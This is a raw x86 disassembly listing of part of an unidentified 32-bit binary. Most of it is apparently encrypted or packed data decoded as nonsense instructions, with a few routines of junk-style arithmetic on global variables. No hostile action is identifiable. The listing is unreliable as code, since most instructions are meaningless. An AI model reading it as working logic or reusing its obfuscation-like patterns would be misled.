  410897:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410898:	and    dh,BYTE PTR [ecx-0x18ee1cec]
  41089e:	xor    al,0x12
  4108a0:	xchg   esi,eax
  4108a1:	cld    
  4108a2:	fistp  QWORD PTR [edx-0x34bd9c12]
  4108a8:	inc    eax
  4108a9:	cmp    edx,esp
  4108ab:	sar    DWORD PTR [ebp-0x29],1
  4108ae:	fist   DWORD PTR [ecx-0x2e]
  4108b1:	mov    esp,ebx
  4108b3:	and    al,0x3a
  4108b5:	inc    ecx
  4108b6:	xchg   ebp,eax
  4108b7:	mov    cl,0x66
  4108b9:	popa   
  4108ba:	pushf  
  4108bb:	call   0x949f4049
  4108c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108c1:	lods   al,BYTE PTR ds:[esi]
  4108c2:	inc    esi
  4108c3:	in     eax,dx
  4108c4:	sbb    al,0x4e
  4108c6:	pop    eax
  4108c7:	and    bh,ch
  4108c9:	mov    al,0x43
  4108cb:	xor    eax,0xd9784271
  4108d0:	xor    al,0x72
  4108d2:	pop    edx
  4108d3:	cmp    DWORD PTR [esi+edi*2],ebx
  4108d6:	add    BYTE PTR [ecx+ecx*8+0x16b8d045],dh
  4108dd:	jp     0x4108fe
  4108df:	sbb    eax,0xf0fa258
  4108e4:	addr16 push edi
  4108e6:	xor    edi,DWORD PTR [ebx-0x19]
  4108e9:	mov    dh,0x33
  4108eb:	stos   DWORD PTR es:[edi],eax
  4108ec:	mov    esp,0xc418ffd4
  4108f1:	std    
  4108f2:	call   0x603c2580
  4108f7:	repz cmp bl,BYTE PTR [ebx]
  4108fa:	imul   eax,DWORD PTR [eax],0xffffffed
  4108fd:	push   edi
  4108fe:	in     eax,dx
  4108ff:	inc    esi
  410900:	aaa    
  410901:	inc    edx
  410902:	les    esp,FWORD PTR [edi]
  410904:	push   ebp
  410905:	hlt    
  410906:	cwde   
  410907:	pop    ebp
  410908:	mov    ds:0xa50986ba,al
  41090d:	cli    
  41090e:	inc    edx
  41090f:	mov    al,0xac
  410911:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410912:	lahf   
  410913:	nop
  410914:	mov    ecx,0x5e399871
  410919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41091a:	ffreep st(5)
  41091c:	xor    eax,0xf6833c44
  410921:	aam    0x52
  410923:	outs   dx,DWORD PTR ds:[esi]
  410924:	sar    BYTE PTR ds:0xed3a2d3d,1
  41092a:	in     al,dx
  41092b:	mov    eax,es:0x9d779545
  410931:	cdq    
  410932:	int    0xab
  410934:	ds jo  0x4109a2
  410937:	jns    0x410915
  410939:	inc    edi
  41093a:	jns    0x4108d4
  41093c:	jp     0x410974
  41093e:	push   es
  41093f:	inc    edx
  410940:	fimul  WORD PTR [edi-0x6ea72fd3]
  410946:	or     ecx,esi
  410948:	adc    ebp,esp
  41094a:	imul   ebp,edx,0xffffffb7
  41094d:	mov    ch,0x30
  41094f:	aas    
  410950:	adc    eax,0x7159c6ed
  410955:	gs out dx,al
  410957:	pop    eax
  410958:	ds add eax,ecx
  41095b:	cmp    DWORD PTR [esi+0x54],eax
  41095e:	pop    esi
  41095f:	je     0x41096d
  410965:	mov    eax,DWORD PTR [ebp+0x8]
  410968:	jmp    0x410986
  41096d:	mov    eax,DWORD PTR [ebp-0x4]
  410970:	xor    eax,edx
  410972:	add    eax,ecx
  410974:	jmp    0x410986
  410979:	mov    eax,DWORD PTR [ebp-0x4]
  41097c:	xor    eax,0x7510851
  410981:	add    eax,0x327299
  410986:	leave  
  410987:	ret    0x4
  41098a:	push   ebp
  41098b:	mov    ebp,esp
  41098d:	push   ecx
  41098e:	mov    ecx,DWORD PTR [ebp+0x8]
  410991:	and    DWORD PTR ds:0x4344ef,0x0
  41099b:	mov    eax,ds:0x4344ef
  4109a0:	inc    eax
  4109a1:	mov    ds:0x4344ef,eax
  4109a6:	cmp    DWORD PTR ds:0x4344ef,0x9
  4109ad:	jne    0x4109c9
  4109b3:	push   0x61e9
  4109b8:	push   DWORD PTR [ebp-0x28]
  4109bb:	push   DWORD PTR [ebp-0x28]
  4109be:	push   0x6f4e
  4109c3:	call   DWORD PTR ds:0x4132a8
  4109c9:	cmp    DWORD PTR ds:0x4344ef,0x8
  4109d0:	jne    0x4109e1
  4109d6:	mov    eax,ds:0x4344ef
  4109db:	inc    eax
  4109dc:	mov    ds:0x4344ef,eax
  4109e1:	cmp    DWORD PTR ds:0x4344ef,0x17
  4109e8:	jb     0x41099b
  4109ee:	movzx  eax,BYTE PTR ds:0x4345cf
  4109f5:	adc    DWORD PTR ds:0x4344e3,eax
  4109fb:	mov    eax,0x7510851
  410a00:	and    DWORD PTR ds:0x4345bb,0x46b5
  410a0a:	xor    ecx,eax
  410a0c:	add    ecx,0x327299
  410a12:	mov    DWORD PTR ds:0x434507,0x530c
  410a1c:	jmp    0x410cd8
  410a21:	cmp    eax,0x7d22e5f8
  410a26:	arpl   bp,di
  410a28:	mov    DWORD PTR [ebx+0x2d],esp
  410a2b:	arpl   di,bp
  410a2d:	idiv   ah
  410a2f:	xchg   esp,eax
  410a30:	sbb    ebp,DWORD PTR [edx-0x628181be]
  410a36:	js     0x410ab6
  410a38:	jle    0x410a33
  410a3a:	stos   DWORD PTR es:[edi],eax
  410a3b:	cwde   
  410a3c:	arpl   WORD PTR [esi],dx
  410a3e:	adc    cl,BYTE PTR [edi]
  410a40:	mov    dh,0xea
  410a42:	adc    bh,BYTE PTR [ebx+0x327c3d85]
  410a48:	sub    ecx,DWORD PTR [edi+eiz*2+0x4b]
  410a4c:	das    
  410a4d:	xchg   edi,eax
  410a4e:	lds    ebx,FWORD PTR [esi+0x6a168f7d]
  410a54:	and    eax,0xd8165ff1
  410a59:	pop    edi
  410a5a:	push   esp
  410a5b:	jnp    0x410a1c
  410a5d:	test   eax,0x5366cfd3
  410a62:	push   0x3c
  410a64:	outs   dx,DWORD PTR ds:[esi]
  410a65:	bound  eax,QWORD PTR [edx-0x2e8a1b3c]
  410a6b:	jmp    0x5b87:0x437f2874
  410a72:	push   ebx
  410a73:	add    DWORD PTR [edi-0x3f82c642],esi
  410a79:	out    0xd3,al
  410a7b:	jmp    0x410a2f
  410a7d:	arpl   WORD PTR [edi],si
  410a7f:	and    ah,BYTE PTR [eax]
  410a81:	(bad)
  410a84:	or     eax,0x913b6e42
  410a89:	sbb    eax,0xe235e01d
  410a8e:	fstp   st(5)
  410a90:	pop    edi
  410a91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a92:	jle    0x410adc
  410a94:	xchg   edi,eax
  410a95:	(bad)  
  410a96:	icebp  
  410a97:	xor    ebp,DWORD PTR [ecx-0x72]
  410a9a:	jmp    0x6e601e6d
  410a9f:	push   ss
  410aa0:	pop    eax
  410aa1:	dec    ebx
  410aa2:	xor    DWORD PTR [esi-0x76e90854],edi
  410aa8:	out    dx,eax
  410aa9:	stos   DWORD PTR es:[edi],eax
  410aaa:	add    DWORD PTR [ebp+0x1ddae959],edx
  410ab0:	mov    edi,0xb1546da
  410ab5:	fsubr  st(7),st
  410ab7:	mov    db6,esi
  410aba:	in     eax,dx
  410abb:	pop    es
  410abc:	inc    ebp
  410abd:	dec    esp
  410abe:	(bad)  
  410ac0:	add    dh,BYTE PTR [ebp+0x82a2862]
  410ac6:	push   ecx
  410ac7:	lds    ebp,FWORD PTR [esi]
  410ac9:	outs   dx,BYTE PTR ds:[esi]
  410aca:	and    esp,eax
  410acc:	mov    ah,0x4f
  410ace:	sub    BYTE PTR [eax-0x4f443e77],0x55
  410ad5:	popa   
  410ad6:	mov    esp,gs
  410ad8:	mov    bh,0xc0
  410ada:	pop    edi
  410adb:	pop    es
  410adc:	push   esp
  410add:	pop    eax
  410ade:	inc    ebx
  410adf:	inc    eax
  410ae0:	retf   
  410ae1:	stc    
  410ae2:	pop    eax
  410ae3:	mov    edi,DWORD PTR [edx+0x57]
  410ae6:	push   0x953a31af
  410aeb:	add    bl,BYTE PTR [ecx-0x14b93f93]
  410af1:	cmp    DWORD PTR [edx+0x78],ecx
  410af4:	push   ecx
  410af5:	pop    ecx
  410af6:	jb     0x410ad9
  410af8:	rol    ebx,0x66
  410afb:	xchg   esi,eax
  410afc:	mov    BYTE PTR [ecx-0xcdcdf50],bl
  410b02:	fwait
  410b03:	and    ch,bl
  410b05:	sbb    DWORD PTR [esi+ebx*4+0x37],ebx
  410b09:	cli    
  410b0a:	sbb    bh,bl
  410b0c:	gs loope 0x410afc
  410b0f:	shl    BYTE PTR [edx-0x6d5f9a58],0xf5
  410b16:	jecxz  0x410b1e
  410b18:	enter  0x9061,0xf0
  410b1c:	xchg   edx,eax
  410b1d:	adc    DWORD PTR [eax-0x11],ebx
  410b20:	(bad)  
  410b22:	retf   
  410b23:	mov    ch,0xd3
  410b25:	icebp  
  410b26:	mov    DWORD PTR [ebp+0x2408cfff],0x7a309391
  410b30:	pop    ebp
  410b31:	out    0xbc,eax
  410b33:	jb     0x410ba0
  410b35:	dec    esp
  410b36:	shl    DWORD PTR [eax-0x735d84c7],0x83
  410b3d:	in     al,dx
  410b3e:	test   BYTE PTR [ebx-0x22],0x76
  410b42:	xchg   edx,eax
  410b43:	repz mov edi,0xed5c7b29
  410b49:	in     eax,dx
  410b4a:	mov    al,0x40
  410b4c:	jnp    0x410b0a
  410b4e:	inc    ecx
  410b4f:	sbb    eax,0x21e0716
  410b54:	sub    ecx,DWORD PTR [eax]
  410b56:	mov    dl,BYTE PTR ds:0x108bc71b
  410b5c:	ja     0x410b90
  410b5e:	add    DWORD PTR [ebx+0x10],ebp
  410b61:	je     0x410b7e
  410b63:	jns    0x410b94
  410b65:	mov    ah,0x8d
  410b67:	sar    BYTE PTR [ecx+0x7c5943f0],0xd9
  410b6e:	fcom   DWORD PTR [edi]
  410b70:	push   cs
  410b71:	push   ecx
  410b72:	in     al,dx
  410b73:	aam    0xc9
  410b75:	adc    dl,cl
  410b77:	hlt    
  410b78:	sbb    edx,0x47
  410b7b:	(bad)
  410b7e:	xchg   ebp,eax
  410b7f:	push   ebp
  410b80:	dec    edx
  410b81:	jbe    0x410b37
  410b83:	cli    
  410b84:	pop    ss
  410b85:	sar    BYTE PTR [esi+0x51],0x54
  410b89:	or     eax,0xa3a043e8
  410b8e:	stos   DWORD PTR es:[edi],eax
  410b8f:	pop    ebx
  410b90:	add    DWORD PTR [edx],eax
  410b92:	pop    eax
  410b93:	imul   esp,DWORD PTR [ebx],0x935f11c0
  410b99:	test   DWORD PTR [eax-0x3c9f8430],edi
  410b9f:	int3   
  410ba0:	test   al,0x33
  410ba2:	pop    edx
  410ba3:	mov    edx,0xffcb4601
  410ba8:	hlt    
  410ba9:	dec    ebx
  410baa:	xchg   edi,eax
  410bab:	mov    ds:0x6812b631,eax
  410bb0:	rol    DWORD PTR [ebx],cl
  410bb2:	cmp    BYTE PTR [edi],dl
  410bb4:	mov    WORD PTR ds:0x4569faa1,ss
  410bba:	push   edx
  410bbb:	and    ch,BYTE PTR ds:0x2413672d
  410bc1:	jle    0x410bea
  410bc3:	mov    eax,0x22c4acf
  410bc8:	add    al,0x53
  410bca:	fild   WORD PTR [esi-0x1d]
  410bcd:	std    
  410bce:	repz mov eax,ds:0xb5f2120d
  410bd4:	int3   
  410bd5:	shl    dh,1
  410bd7:	bnd jne 0x410c07
  410bda:	and    eax,0x8a6f3ff9
  410bdf:	pushf  
  410be0:	push   es
  410be1:	ds (bad) 
  410be3:	not    DWORD PTR [ebp+0x1]
  410be6:	scas   al,BYTE PTR es:[edi]
  410be7:	jnp    0x410b72
  410be9:	or     al,ch
  410beb:	bound  edx,QWORD PTR [esi+0x1a]
  410bee:	ins    DWORD PTR es:[edi],dx
  410bef:	(bad)  
  410bf1:	call   0xf071:0xae44bcb
  410bf8:	or     al,0x2c
  410bfa:	test   DWORD PTR [ebx],eax
  410bfc:	imul   edi,DWORD PTR [ebp+0x2f],0x45e6909a
  410c03:	es cli 
  410c05:	adc    edx,DWORD PTR [ebx]
  410c07:	(bad)  
  410c08:	or     eax,DWORD PTR [ecx+ebx*2+0x5d]
  410c0c:	dec    ebx
  410c0d:	push   ecx
  410c0e:	sbb    al,0xcf
  410c10:	ss push esp
  410c12:	lods   eax,DWORD PTR ds:[esi]
  410c13:	sbb    al,0xd6
  410c15:	adc    ah,bh
  410c17:	mov    esp,0xe1e5dd67
  410c1c:	push   cs
  410c1d:	adc    DWORD PTR [eax],ebx
  410c1f:	leave  
  410c20:	mov    cl,0x51
  410c22:	iret   
  410c23:	out    0xea,eax
  410c25:	pop    ebp
  410c26:	pop    ecx
  410c27:	ja     0x410c3e
  410c29:	test   al,0xa3
  410c2b:	pop    esp
  410c2c:	xor    BYTE PTR [esi+0x79a37266],al
  410c32:	push   ecx
  410c33:	mov    ebp,0x56736d49
  410c38:	rol    DWORD PTR [eax],cl
  410c3a:	out    dx,al
  410c3b:	aaa    
  410c3c:	mov    dl,0xa1
  410c3e:	cli    
  410c3f:	shr    DWORD PTR [edi-0x80],0xae
  410c43:	je     0x410c88
  410c45:	pop    ecx
  410c46:	pop    ds
  410c47:	jmp    0xa7fb:0x301ef2c0
  410c4e:	mov    BYTE PTR [ebx+0xd34c2ba],cl
  410c54:	inc    edx
  410c55:	jp     0x410c8e
  410c57:	add    eax,0xef937184
  410c5c:	cmp    al,0xf5
  410c5e:	jne    0x410cb9
  410c60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c61:	pop    ebp
  410c62:	adc    eax,0xe5e2f67c
  410c67:	sti    
  410c68:	inc    esi
  410c69:	(bad)  
  410c6a:	mov    ds:0x5f29bec8,eax
  410c6f:	clc    
  410c70:	mov    ch,0x9a
  410c72:	xchg   edi,eax
  410c73:	pop    ebp
  410c74:	fst    QWORD PTR [ebp+0x3b4b52b3]
  410c7a:	and    esi,0x97a1cc8f
  410c80:	sbb    ah,BYTE PTR [edi-0xbedeac4]
  410c86:	xor    BYTE PTR [esp+ebx*8-0x5edad750],0x8a
  410c8e:	xchg   esi,eax
  410c8f:	xchg   esi,eax
  410c90:	sbb    ecx,edx
  410c92:	popa   
  410c93:	fist   DWORD PTR [esi+0x477d7b2]
  410c99:	sbb    eax,DWORD PTR [ecx-0x38]
  410c9c:	and    esp,edx
  410c9e:	add    eax,0x404072c9
  410ca3:	loop   0x410c31
  410ca5:	pop    eax
  410ca6:	sbb    ebx,0x5292c896
  410cac:	sbb    BYTE PTR [edi],ch
  410cae:	ja     0x410c38
  410cb0:	and    eax,0x509e318d
  410cb5:	imul   edi,DWORD PTR [edx-0x283ef16],0x10
  410cbc:	dec    esi
  410cbd:	loopne 0x410cac
  410cbf:	sub    eax,DWORD PTR fs:[ecx+0x3f]
  410cc3:	in     al,dx
  410cc4:	mov    fs,ecx
  410cc6:	ficomp DWORD PTR [ebp+0x49]
  410cc9:	push   ss
  410cca:	add    eax,0x9c8aa601
  410ccf:	cmp    al,0x5c
  410cd1:	mov    eax,0xb348d7d4
  410cd6:	push   ss
  410cd7:	jle    0x410c62
  410cd9:	dec    ebp
  410cda:	adc    BYTE PTR [ebx+0x4345c70d],cl
  410ce0:	add    bh,al
  410ce2:	inc    ebp
  410ce3:	or     BYTE PTR [edx-0x38f0cb32],bh
  410ce9:	inc    ebp
  410cea:	cld    
  410ceb:	cmp    eax,0x8bf89c85
  410cf0:	or     eax,0x4344e3
  410cf5:	mov    ecx,0xf89c8539
  410cfa:	push   esi
  410cfb:	mov    DWORD PTR [ebp+0x10],0x70019f8
  410d02:	mov    DWORD PTR ds:0x43460b,edx
  410d08:	mov    esi,DWORD PTR [ebp-0x4]
  410d0b:	cmp    ecx,esi
  410d0d:	mov    DWORD PTR ds:0x434613,0x165f
  410d17:	je     0x411018
  410d1d:	mov    esi,DWORD PTR [ebp+0xc]
  410d20:	xor    ecx,eax
  410d22:	sub    DWORD PTR ds:0x4345c7,0x434583
  410d2c:	xor    esi,eax
  410d2e:	xor    DWORD PTR ds:0x434607,0x6bfa
  410d38:	lea    ecx,[esi+ecx*1+0x327299]
  410d3f:	xor    ecx,eax
  410d41:	cmp    ecx,0xf89c8526
  410d47:	jne    0x410cfb
  410d4d:	mov    DWORD PTR ds:0x43458f,0x7d20
  410d57:	jmp    0x411302
  410d5c:	jmp    0x411018
  410d61:	inc    ebp
  410d62:	lods   al,BYTE PTR ds:[esi]
  410d63:	xchg   DWORD PTR [ebx],ebx
  410d65:	addr16 and eax,0xe5906c6d
  410d6b:	mov    DWORD PTR [ebx+0x43cb2d61],esi
  410d71:	leave  
  410d72:	dec    ebp
  410d73:	jle    0x410df3
  410d75:	popf   
  410d76:	js     0x410df6
  410d78:	jle    0x410d05
  410d7a:	or     edi,eax
  410d7c:	fnsave [esi-0x7a]
  410d7f:	add    BYTE PTR [eax],ah
  410d81:	xor    al,0xe6
  410d83:	icebp  
  410d84:	jmp    0x410dd7
  410d86:	dec    esp
  410d87:	aam    0x34
  410d89:	mov    ds:0xf47e0d0b,eax
  410d8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d8f:	call   0x8c4313e3
  410d94:	gs cli 
  410d96:	jo     0x410d63
  410d98:	shl    BYTE PTR ds:0x17c004f9,cl
  410d9e:	pop    ss
  410d9f:	ror    DWORD PTR [edi-0x6807af71],1
  410da5:	sub    ecx,edi
  410da7:	mov    ecx,0x7fa382e3
  410dac:	xor    al,0x90
  410dae:	sub    esi,ecx
  410db0:	popf   
  410db1:	dec    ebp
  410db2:	inc    ebp
  410db3:	test   esi,0x18dd512d
  410db9:	mov    ds:0x393571a1,al
  410dbe:	mov    esp,0x1c45df80
  410dc3:	lods   al,BYTE PTR ds:[esi]
  410dc4:	or     ecx,DWORD PTR [edi+0x4b]
  410dc7:	mov    dl,0x6d
  410dc9:	imul   esi,DWORD PTR [ebx+0x6b],0x41
  410dcd:	dec    ebp
  410dce:	xor    BYTE PTR [edi-0x138159d3],ch
  410dd4:	loop   0x410d8e
  410dd6:	hlt    
  410dd7:	jecxz  0x410dc6
  410dd9:	(bad)  
  410dda:	cmp    eax,0x1fe97f67
  410ddf:	lock in eax,dx
  410de1:	out    0x16,eax
  410de3:	dec    ebx
  410de4:	sahf   
  410de5:	pop    esp
  410de6:	adc    ah,bh
  410de8:	sub    dh,BYTE PTR [ebx]
  410dea:	sbb    al,0x4c
  410dec:	mov    esp,0x29144a9c
  410df1:	fmul   st(6),st
  410df3:	clc    
  410df4:	leave  
  410df5:	repz popa 
  410df7:	aas    
  410df8:	xchg   esp,eax
  410df9:	inc    ecx
  410dfa:	xchg   ecx,eax
  410dfb:	(bad)  
  410dfc:	into   
  410dfd:	fidivr DWORD PTR [eax-0x60]
  410e00:	push   esp
  410e01:	fucomp st(4)
  410e03:	in     eax,dx
  410e04:	jbe    0x410e81
  410e06:	(bad)  
  410e07:	push   ebp
  410e08:	mov    esp,0x90571959
  410e0d:	(bad)  
  410e0e:	jg     0x410dc4
  410e10:	add    al,0x1c
  410e12:	out    0xaa,eax
  410e14:	cmp    esp,DWORD PTR [ebx]
  410e16:	dec    esp
  410e17:	sbb    eax,0xdef9dc98
  410e1c:	js     0x410e61
  410e1e:	loopne 0x410dd5
  410e20:	data16 out dx,al
  410e22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e23:	test   al,0x80
  410e25:	jae    0x410e5f
  410e27:	jmp    0x410dea
  410e29:	sub    al,0x2a
  410e2b:	les    edi,FWORD PTR [ebx-0x32a09238]
  410e31:	retf   0xdbbe
  410e34:	jmp    0x2cfc:0x982cd9c7
  410e3b:	pop    fs
  410e3d:	cmp    ebp,edi
  410e3f:	sub    al,0x4f
  410e41:	push   es
  410e42:	add    bl,cl
  410e44:	lea    esi,[edx-0x65]
  410e47:	xchg   edi,eax
  410e48:	lahf   
  410e49:	dec    al
  410e4b:	out    0x39,al
  410e4d:	mov    ds:0xda17e0cd,eax
  410e52:	adc    eax,0xe9add9c1
  410e58:	dec    edx
  410e59:	in     al,dx
  410e5a:	lds    edi,FWORD PTR [ebx+ecx*2+0x33e92cad]
  410e61:	sbb    edx,DWORD PTR [esi-0x30]
  410e64:	xchg   edx,eax
  410e65:	mov    ebx,0x768eee04
  410e6a:	out    dx,eax
  410e6b:	push   esi
  410e6c:	cmp    al,BYTE PTR [esi-0x1923a0de]
  410e72:	add    al,0xc9
  410e74:	and    BYTE PTR [ebx],ah
  410e76:	push   0x6ac31454
  410e7b:	pop    ebp
  410e7c:	dec    ecx
  410e7d:	loop   0x410e08
  410e7f:	inc    edx
  410e80:	adc    eax,0xc0ecd18f
  410e85:	add    DWORD PTR [eax+0x6a68892d],edi
  410e8b:	(bad)  
  410e8c:	addr16 pop ds
  410e8e:	jl     0x410eb8
  410e90:	sbb    eax,0x989124cb
  410e95:	sbb    BYTE PTR [ebp+eax*8-0x184461a8],dh
  410e9c:	jmp    0x8f1a1ec5
  410ea1:	sbb    BYTE PTR [edi-0x1cdfb675],0x3d
  410ea8:	add    ecx,edi
  410eaa:	ret    
  410eab:	sub    al,0x9f
  410ead:	test   BYTE PTR [ecx-0x2bd530d0],ch
  410eb3:	cwde   
  410eb4:	pop    edi
  410eb5:	adc    al,0x7f
  410eb7:	mov    bh,0xae
  410eb9:	adc    eax,0x93938a55
  410ebe:	int3   
  410ebf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ec0:	push   es
  410ec1:	dec    ebp
  410ec2:	je     0x410e80
  410ec4:	popa   
  410ec5:	inc    edx
  410ec6:	inc    esi
  410ec7:	inc    esp
  410ec8:	out    dx,al
  410ec9:	fdivrp st(7),st
  410ecb:	sbb    ecx,edi
  410ecd:	add    edx,edi
  410ecf:	jno    0x410f32
  410ed1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ed2:	sbb    ah,BYTE PTR ss:[esi-0x53798f46]
  410ed9:	mov    ecx,0x4a120abe
  410ede:	out    dx,eax
  410edf:	ret    0x76
  410ee2:	push   edx
  410ee3:	test   DWORD PTR [eax+ebx*4+0x9],esp
  410ee7:	pop    dx
  410ee9:	mov    ?,WORD PTR [ebp+0x5ee0f5bb]
  410eef:	ret    0x55be
  410ef2:	clc    
  410ef3:	sbb    eax,0x796d46a
  410ef8:	stc    
  410ef9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410efa:	mov    cl,0xd7
  410efc:	jge    0x410ed9
  410efe:	add    al,0x35
  410f00:	pop    ebp
  410f01:	in     eax,dx
  410f02:	inc    esp
  410f03:	jnp    0x410ea1
  410f05:	pop    ebx
  410f06:	jmp    0x410f71
  410f08:	iret   
  410f09:	jae    0x410f70
  410f0b:	int3   
  410f0c:	ret    
  410f0d:	out    dx,al
  410f0e:	dec    ebp
  410f0f:	jmp    0x15fb:0xe54eca21
  410f16:	xor    ebp,ebp
  410f18:	dec    esi
  410f19:	pop    es
  410f1a:	push   esp
  410f1b:	or     DWORD PTR [eax-0x1d],0x55510438
  410f22:	push   esi
  410f23:	mov    dh,0xc2
  410f25:	add    edx,ebx
  410f27:	icebp  
  410f28:	sbb    ecx,DWORD PTR [esp+ebp*4]
  410f2b:	rcl    DWORD PTR [ebp+0x6a],cl
  410f2e:	out    0xd,al
  410f30:	dec    ebp
  410f31:	cmp    al,0x3a
  410f33:	dec    ebx
  410f34:	or     al,0x30
  410f36:	jns    0x410f91
  410f38:	xchg   esi,eax
  410f39:	jae    0x410f76
  410f3b:	sub    eax,0xea5b2fe6
  410f40:	pop    esp
  410f41:	push   esp
  410f42:	in     eax,0xc6
  410f44:	xchg   ebp,eax
  410f45:	mov    BYTE PTR [esi],bl
  410f47:	push   ds
  410f48:	xchg   edi,eax
  410f49:	pop    esi
  410f4a:	(bad)  
  410f4b:	sbb    ch,dh
  410f4d:	cmp    ch,BYTE PTR [ebx+0x3b372246]
  410f53:	fwait
  410f54:	inc    ecx
  410f55:	in     al,dx
  410f56:	leave  
  410f57:	jmp    0x35f:0xec3f3b66
  410f5e:	mov    dl,0x31
  410f60:	mov    edi,0x7df47b27
  410f65:	lea    ebp,[esp+eax*1+0x40c33e7c]
  410f6c:	lock sub eax,0x53ab951c
  410f72:	mov    ds:0x9ce0fa37,al
  410f77:	mov    ds:0xd15911a1,eax
  410f7c:	cld    
  410f7d:	add    eax,0xbad784b1
  410f82:	mov    ecx,0x166f4180
  410f87:	push   0x6a
  410f89:	push   0x8c2c30ff
  410f8e:	jecxz  0x410fd2
  410f90:	mov    esi,0xa3f2215f
  410f95:	jp     0x410f4f
  410f97:	aam    0x13
  410f99:	pop    esp
  410f9a:	shl    BYTE PTR [esi-0x4770bc44],1
  410fa0:	mov    bh,0x71
  410fa2:	or     DWORD PTR [ecx-0x79],ecx
  410fa5:	jo     0x410f87
  410fa7:	pusha  
  410fa8:	shl    al,cl
  410faa:	aas    
  410fab:	push   ds
  410fac:	mov    al,ds:0xe09e6b67
  410fb1:	cmp    DWORD PTR [ecx+0x0],ebp
  410fb4:	lock jnp 0x410f3b
  410fb7:	dec    esi
  410fb8:	aam    0x7
  410fba:	mov    esi,0x4252df4a
  410fbf:	in     eax,dx
  410fc0:	es inc esi
  410fc2:	out    0xc6,al
  410fc4:	sub    al,0xfb
  410fc6:	xor    edx,DWORD PTR [ebx+0x5a]
  410fc9:	sbb    eax,0xd2145b35
  410fce:	sbb    DWORD PTR [ebx],edi
  410fd0:	clc    
  410fd1:	(bad)  
  410fd3:	lock mov gs,WORD PTR [esi+0x7c11f6c]
  410fda:	ins    BYTE PTR es:[edi],dx
  410fdb:	icebp  
  410fdc:	sbb    eax,esi
  410fde:	adc    BYTE PTR [eax+0x25a29dda],ch
  410fe4:	fcomp  DWORD PTR [esi-0x14]
  410fe7:	cmp    esi,0xb2c2530f
  410fed:	repnz inc ecx
  410fef:	inc    eax
  410ff0:	mov    esi,0x1ec6fcf3
  410ff5:	and    al,0xa3
  410ff7:	mov    al,0x93
  410ff9:	mov    ss:0xeb9ca6ec,al
  410fff:	call   FWORD PTR [eax-0x59]
  411002:	arpl   WORD PTR [esi+0xd],bp
  411005:	dec    esi
  411006:	lods   eax,DWORD PTR ds:[esi]
  411007:	sub    ecx,ecx
  411009:	mov    dl,0x1d
  41100b:	add    ecx,esp
  41100d:	cmp    eax,DWORD PTR [edx-0x35]
  411010:	test   edi,eax
  411012:	mov    al,0x5a
  411014:	mov    ebx,0x8157e5f8
  411019:	shl    DWORD PTR [edi-0x73],0xcd
  41101d:	dec    DWORD PTR [ebx+0x3f033f1]
  411023:	jne    0x41102d
  411025:	mov    DWORD PTR [ebp+0x8],esi
  411028:	mov    esi,DWORD PTR [ebp+0x8]
  41102b:	xor    esi,ecx
  41102d:	jmp    0x4112e9
  411032:	jo     0x41107c
  411034:	rsqrtps xmm6,XMMWORD PTR [edi]
  411037:	pop    ebp
  411038:	jge    0x4110ae
  41103a:	pop    ecx
  41103b:	mov    ebx,0xacae4754
  411040:	and    bh,al
  411042:	push   0x9d7e7e4f
  411047:	js     0x4110c7
  411049:	jle    0x4110c5
  41104b:	sbb    dh,BYTE PTR [ebp-0x4e]
  41104e:	test   edx,0x27eea2a0
  411054:	stc    
  411055:	shl    DWORD PTR [eax],0x6d
  411058:	push   edx
  411059:	out    dx,al
  41105a:	ret    0x5eb4
  41105d:	and    eax,0x328b9613
  411062:	cmp    eax,0xf7422a59
  411067:	fucomp st(2)
  411069:	loope  0x41106e
  41106b:	je     0x41101d
  41106d:	dec    ebx
  41106e:	stc    
  41106f:	or     edi,DWORD PTR [esi-0x3b]
  411072:	inc    DWORD PTR [ebx-0x3df60a5]
  411078:	fisttp QWORD PTR [edi]
  41107a:	dec    ebx
  41107b:	add    BYTE PTR [esi-0x223531b9],al
  411081:	pop    eax
  411082:	inc    eax
  411083:	add    al,0x53
  411085:	jnp    0x4110fd
  411087:	push   eax
  411088:	inc    edx
  411089:	cmp    bl,BYTE PTR [esi]
  41108b:	lods   eax,DWORD PTR ds:[esi]
  41108c:	inc    esi
  41108d:	sahf   
  41108e:	xor    esp,0xffffffc1
  411091:	lahf   
  411092:	bound  esp,QWORD PTR [edx]
  411094:	add    BYTE PTR [ebx+0x37],0xff
  411098:	mov    bh,0xc0
  41109a:	repz out 0x4c,al
  41109d:	adc    esp,DWORD PTR [esi]
  41109f:	sahf   
  4110a0:	rcr    ah,cl
  4110a2:	xchg   ecx,eax
  4110a3:	jb     0x411120
  4110a5:	or     eax,0x5581d4df
  4110aa:	test   eax,0x997c4575
  4110af:	sub    al,0x83
  4110b1:	jbe    0x411124
  4110b3:	inc    edi
  4110b4:	(bad)  
  4110b5:	cld    
  4110b6:	mov    edi,0x43448e51
  4110bb:	aaa    
  4110bc:	fwait
  4110bd:	loope  0x4110f2
  4110bf:	push   ss
  4110c0:	pusha  
  4110c1:	mov    al,0x4d
  4110c3:	mov    BYTE PTR [edx-0x4d0768cd],dh
  4110c9:	and    eax,0xa04a3384
  4110ce:	cmp    BYTE PTR [ecx-0x5e],al
  4110d1:	out    dx,al
  4110d2:	out    0x21,al
  4110d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110d5:	and    eax,0x7690a1d2
  4110da:	or     BYTE PTR [eax+0x2c36de02],dh
  4110e0:	jmp    0xfa84:0xece3879e
  4110e7:	push   ebp
  4110e8:	xchg   ebp,eax
  4110e9:	(bad)  
  4110ea:	cmc    
  4110eb:	mov    ah,0x45
  4110ed:	adc    dh,dl
  4110ef:	(bad)  
  4110f0:	aam    0x9
  4110f2:	ds dec esi
  4110f4:	loopne 0x4110b7
  4110f6:	scas   eax,DWORD PTR es:[edi]
  4110f7:	lods   eax,DWORD PTR ds:[esi]
  4110f8:	popa   
